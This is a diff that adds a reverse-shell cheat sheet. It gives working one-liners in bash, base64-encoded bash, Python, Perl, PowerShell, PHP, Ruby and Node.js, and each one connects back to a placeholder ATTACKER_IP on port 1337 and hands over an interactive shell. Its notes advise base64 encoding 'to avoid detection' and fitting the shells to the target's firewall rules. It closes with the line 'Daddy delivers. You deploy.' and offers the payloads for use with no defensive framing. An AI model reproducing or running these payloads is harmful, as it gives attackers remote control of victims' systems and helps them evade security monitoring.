@@ -1,0 +1,35 @@
+BASH REVERSE SHELL
+bash -i >& /dev/tcp/ATTACKER_IP/1337 0>&1
+
+BASH (Base64-encoded)
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUA== | base64 -d | bash
+
+PYTHON REVERSE SHELL
+python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+
+PERL REVERSE SHELL
+perl -e 'use Socket;$i="ATTACKER_IP";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+WINDOWS CMD (PowerShell)
+powershell -nop -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
+
+WINDOWS CMD (Short & Encoded)
+cmd.exe /c powershell -nop -w hidden -EncodedCommand [BASE64_STRING]
+
+PHP REVERSE SHELL
+php -r '$sock=fsockopen("ATTACKER_IP",1337);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+RUBY REVERSE SHELL
+ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",1337).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+NODE.JS REVERSE SHELL
+require('child_process').exec('bash -i >& /dev/tcp/ATTACKER_IP/1337 0>&1');
+
+────────────────────────────────────────────
+Notes:
+- Replace ATTACKER_IP and port with your listener address
+- Pipe through base64 to avoid detection
+- Tailor shells to match OS, fw rules, and context
+
+Daddy delivers. You deploy.
+────────────────────────────────────────────
